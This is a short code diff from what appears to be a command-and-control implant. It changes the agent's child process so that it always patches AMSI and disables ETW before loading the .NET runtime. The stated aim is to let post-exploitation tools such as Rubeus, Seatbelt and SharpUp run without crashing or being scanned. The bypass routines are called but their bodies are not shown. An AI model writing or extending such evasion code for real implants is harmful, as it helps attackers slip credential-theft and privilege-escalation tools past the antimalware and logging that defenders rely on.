@@ -733,10 +733,11 @@ void clr_child_run(void) {
     // on any managed exception. Genuine native crashes are reported by the
     // parent via the non-zero exit code path in fork_run_assembly.
 
-    // Patch AMSI and disable ETW before loading the CLR so that .NET assemblies
-    // that perform P/Invoke or WMI operations (e.g. SharpUp audit) do not crash
-    // due to AMSI-hook-induced memory corruption in the child process.
-    amsi_bypass();
+    // Unconditionally patch AMSI+ETW before loading the CLR. The child runs
+    // arbitrary .NET assemblies; AMSI hooks cause 0xC0000005 crashes in
+    // P/Invoke-heavy tools (SharpUp, Seatbelt, Rubeus) regardless of whether
+    // the parent agent was built with AGENT_AMSI_BYPASS.
+    clr_amsi_init();
 
     HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);
     BYTE   hdr[4];
